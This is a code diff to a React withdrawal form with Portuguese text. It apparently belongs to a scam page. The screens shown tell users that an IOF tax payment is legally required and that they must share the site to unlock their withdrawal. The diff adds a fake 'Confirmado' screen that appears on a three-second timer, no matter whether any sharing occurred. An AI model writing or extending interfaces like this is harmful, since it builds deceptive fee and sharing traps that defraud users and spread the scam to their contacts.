@@ -1,5 +1,5 @@
 import { useState, useEffect } from "react";
-import { Ban } from "lucide-react";
+import { Ban, Check } from "lucide-react";
 import { Switch } from "@/components/ui/switch";
 import {
   Dialog,
@@ -16,6 +16,7 @@ const WithdrawForm = () => {
   const [errors, setErrors] = useState<{[key: string]: boolean}>({});
   const [showLoadingModal, setShowLoadingModal] = useState(false);
   const [showBlockedScreen, setShowBlockedScreen] = useState(false);
+  const [showConfirmed, setShowConfirmed] = useState(false);
 
   useEffect(() => {
     if (showLoadingModal && !showBlockedScreen) {
@@ -46,6 +47,11 @@ const WithdrawForm = () => {
         description: "O link foi copiado para a área de transferência.",
       });
     }
+    
+    // Show confirmed screen after 3 seconds
+    setTimeout(() => {
+      setShowConfirmed(true);
+    }, 3000);
   };
 
   const handleSubmit = () => {
@@ -171,7 +177,10 @@ const WithdrawForm = () => {
         {/* Loading Modal */}
         <Dialog open={showLoadingModal} onOpenChange={(open) => {
           setShowLoadingModal(open);
-          if (!open) setShowBlockedScreen(false);
+          if (!open) {
+            setShowBlockedScreen(false);
+            setShowConfirmed(false);
+          }
         }}>
           <DialogContent className="bg-white rounded-2xl p-8 max-w-[340px] border-0 shadow-xl flex flex-col items-center gap-6 [&>button]:hidden">
             {!showBlockedScreen ? (
@@ -201,6 +210,18 @@ const WithdrawForm = () => {
                   O pagamento da taxa IOF é obrigatória conforme a Lei nº 5.143, de 20 de outubro de 1966.
                 </p>
               </div>
+            ) : showConfirmed ? (
+              <div className="w-full flex flex-col items-center gap-6">
+                {/* Confirmed Screen */}
+                <h2 className="text-foreground text-2xl text-center" style={{ fontFamily: "'Open Sans', sans-serif", fontWeight: 700 }}>
+                  Confirmado
+                </h2>
+                
+                {/* Check Icon */}
+                <div className="w-40 h-40 flex items-center justify-center">
+                  <Check className="w-36 h-36 text-green-600" strokeWidth={2.5} />
+                </div>
+              </div>
             ) : (
               <div className="w-full flex flex-col items-center gap-6">
                 {/* Blocked Screen */}
@@ -214,7 +235,7 @@ const WithdrawForm = () => {
                 </div>
 
                 <p className="text-foreground text-xl text-center leading-snug" style={{ fontFamily: "'Open Sans', sans-serif", fontWeight: 600 }}>
-                  Compartilhe este site com 5 pessoas para desbloquear.
+                  Compartilhe este site para desbloquear.
                 </p>
 
                 {/* Share Button */}
